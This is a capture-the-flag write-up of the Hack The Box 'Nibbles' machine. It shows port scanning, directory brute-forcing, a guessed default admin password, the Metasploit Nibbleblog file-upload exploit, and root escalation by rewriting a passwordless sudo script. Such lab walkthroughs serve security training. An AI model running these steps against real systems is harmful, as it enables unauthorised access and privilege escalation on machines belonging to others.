# Hack the box - Nibbles

<img align="left" src="logo.png">
&nbsp;<span style="color:#b5e853; font-weight: bold">OS: <img align="top" src="../../../images/linux.png"> </span><b>Linux</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">IP: </span><b>10.10.10.75</b>

&nbsp;<span style="color:#b5e853; font-weight: bold">Difficulity: </span><b>Easy</b>
&nbsp;<span style="color:#b5e853; font-weight: bold">Release: </span><b>2018 Jan 13</b>

___

## Port scanning
```
nmap -sC -sV -T4 -oA nmap 10.10.10.75
```

![Nmap results](./nmap.png)

We can see that machine has web server.

## Web fingerprinting

When we go on the index page, there is simple "Hello world!" text with directory hidden in source:

![Index page](index_page.png)

We could try to directory bruteforce with ffuf:

```
ffuf -t 100 -w http://10.10.10.75/nibbleblog/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Fuff directory bruteforce](ffuf_directory.png)

/nibbleblog/admin contains login page:

![Admin page](admin_login.png)

There is also README file accessible that could give hints about web application version:

![Readme file](readme_file.png)

There is information about service version that we could use to find exploits:

![Searchsploit](searchsploit.png)

It seems that the blog is vulnerable. But we need to have login access to upload file. Different credentials were tried but admin:nibbles seems to work:

![Nibbles dashboard](nibbles_dashboard.png)

## Exploitation

We will use metasploit framework:

```
use exploit/multi/http/nibbleblog_file_upload
set rhosts 10.10.10.75
set username admin
set password nibbles
set targeturi /nibbleblog/
run
```

![Exploitation](exploitation.png)

## Getting user flag

After complete exploit, we have access to user home directory where is our 1st flag:

![User flag](user_flag.png)

## Privilege escalation

There is script running that have no password required for sudo rights:

```
sudo -l
```

![Sudo without password](sudo_nopasswd.png)

We could use that file to output root flag with shell script:

```
echo "#!/bin/bash" > /home/nibbler/personal/stuff/monitor.sh
echo "cat /root/root.txt" >> /home/nibbler/personal/stuff/monitor.sh
sudo -u root /home/nibbler/personal/stuff/monitor.sh
```

![Root flag](root_flag.png)